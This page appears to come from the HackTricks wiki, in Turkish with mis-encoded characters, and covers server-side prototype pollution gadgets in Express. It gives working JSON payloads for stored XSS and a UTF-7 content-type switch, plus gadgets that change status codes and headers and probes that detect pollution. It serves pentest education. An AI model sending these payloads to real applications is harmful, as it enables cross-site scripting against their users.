# Express Prototype Pollution Gadgets

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), bir ÅŸirketin veya mÃ¼ÅŸterilerinin **stealer malwares** tarafÄ±ndan **tehdit edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevsellikler sunan **karanlÄ±k aÄŸ** destekli bir arama motorudur.

WhiteIntel'in ana hedefi, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Web sitelerini kontrol edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

## XSS yanÄ±tlarÄ± sunun

**Daha fazla ayrÄ±ntÄ± iÃ§in** [**orijinal araÅŸtÄ±rmaya gÃ¶z atÄ±n**](https://portswigger.net/research/server-side-prototype-pollution)

### JSON iÃ§erik tÃ¼rÃ¼nÃ¼ HTML olarak deÄŸiÅŸtirin

Bir **JSON iÃ§erik tÃ¼rÃ¼ yanÄ±tÄ±** kullanan bir Express uygulamasÄ±nda ve bir JSON'u yansÄ±tarak:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Bu durumlarda XSS genellikle JSON iÃ§erik tÃ¼rÃ¼ ile mÃ¼mkÃ¼n deÄŸildir. Ancak, prototip kirlenmesi ile **Express'i HTML yanÄ±tÄ± sunmasÄ± iÃ§in kandÄ±rabiliriz.** Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, uygulamanÄ±n **`res.send(obj)`** kullanmasÄ±na ve uygulama/json iÃ§erik tÃ¼rÃ¼ ile gÃ¶vde ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ± kullanmasÄ±na dayanÄ±r.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** ve **`_body`** Ã¶zelliklerini **kirleterek**, **Express'in HTML iÃ§erik tÃ¼rÃ¼nÃ¼ sunmasÄ±nÄ±** saÄŸlamak ve `_body` Ã¶zelliÄŸini yansÄ±tmak mÃ¼mkÃ¼ndÃ¼r; bu da saklÄ± XSS'e yol aÃ§ar.

### UTF7'yi Render Et

Express'in **UTF-7 iÃ§eriÄŸini render etmesini saÄŸlamak mÃ¼mkÃ¼ndÃ¼r**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## GÃ¼venli Tarama Teknikleri

### JSON boÅŸluklarÄ±

AÅŸaÄŸÄ±daki PP, bir JSON iÃ§indeki niteliklerin ekstra bir boÅŸluÄŸa sahip olmasÄ±nÄ± saÄŸlayacak ve bu, iÅŸlevselliÄŸi bozmayacaktÄ±r:
```json
{"__proto__":{"json spaces": " "}}
```
O zaman yansÄ±tÄ±lmÄ±ÅŸ JSON ÅŸÃ¶yle gÃ¶rÃ¼necektir:
```json
{"foo":  "bar"} -- Note the extra space
```
### AÃ§Ä±k BaÅŸlÄ±klar

AÅŸaÄŸÄ±daki PP aracÄ±, sunucunun HTTP baÅŸlÄ±ÄŸÄ±nÄ± geri gÃ¶ndermesini saÄŸlayacaktÄ±r: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORS modÃ¼lÃ¼nÃ¼n yÃ¼klenmesi gerekmektedir**

### **OPTIONS YÃ¶ntemi**

AÅŸaÄŸÄ±daki yÃ¼k ile, **OPTIONS yanÄ±tÄ±ndan bir yÃ¶ntemi gizlemek** mÃ¼mkÃ¼ndÃ¼r:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Durum**

AÅŸaÄŸÄ±daki PP yÃ¼kÃ¼nÃ¼ kullanarak **geri dÃ¶nen durum kodunu** deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r:
```json
{"__proto__":{"status":510}}
```
### Hata

Bir prototipe bir dize gibi bir ilkel atadÄ±ÄŸÄ±nÄ±zda, bu **prototipin bir nesne olmasÄ± gerektiÄŸinden no-op iÅŸlemi Ã¼retir**. EÄŸer bir prototip nesnesini `Object.prototype`'a atamaya Ã§alÄ±ÅŸÄ±rsanÄ±z, bu **bir istisna fÄ±rlatÄ±r**. Bu iki davranÄ±ÅŸÄ± **prototip kirliliÄŸinin baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in** kullanabiliriz:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### YansÄ±tÄ±lan DeÄŸer

Bir uygulama yanÄ±tÄ±nda bir nesne iÃ§erdiÄŸinde, **`__proto__` ile birlikte alÄ±ÅŸÄ±lmadÄ±k bir adla bir Ã¶zellik oluÅŸturmak** bilgilendirici olabilir. Ã–zellikle, eÄŸer **yalnÄ±zca alÄ±ÅŸÄ±lmadÄ±k Ã¶zellik yanÄ±t olarak dÃ¶ndÃ¼rÃ¼lÃ¼yorsa**, bu uygulamanÄ±n zayÄ±flÄ±ÄŸÄ±nÄ± gÃ¶sterebilir:
```json
{"unusualName":"value","__proto__":"test"}
```
AyrÄ±ca, Lodash gibi bir kÃ¼tÃ¼phane kullanÄ±ldÄ±ÄŸÄ±nda, bir Ã¶zelliÄŸi hem prototip kirlenmesi (PP) yoluyla hem de doÄŸrudan nesne iÃ§inde ayarlamak baÅŸka bir tanÄ±sal yaklaÅŸÄ±m sunar. EÄŸer bÃ¶yle bir Ã¶zellik yanÄ±ttan Ã§Ä±karÄ±lmÄ±ÅŸsa, bu, Lodash'Ä±n birleÅŸtirmeden Ã¶nce hedef nesnede Ã¶zelliÄŸin varlÄ±ÄŸÄ±nÄ± doÄŸruladÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Dots'a Ä°zin Ver

Express'te **sorgu dizesi parametrelerinden nesneler oluÅŸturmanÄ±za** olanak tanÄ±yan bir seÃ§enek vardÄ±r.\
Kesinlikle bir hata **zincirinde** kullanarak bir **prototip kirlenmesi aÃ§Ä±ÄŸÄ±nÄ±** istismar edebilirsiniz.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Node'da bir nesne oluÅŸturur.**

## Referanslar

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), bir ÅŸirketin veya mÃ¼ÅŸterilerinin **stealer malwares** tarafÄ±ndan **tehdit altÄ±na alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ±** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunan bir **karanlÄ±k aÄŸ** destekli arama motorudur.

WhiteIntel'in ana hedefi, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Web sitelerini kontrol edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
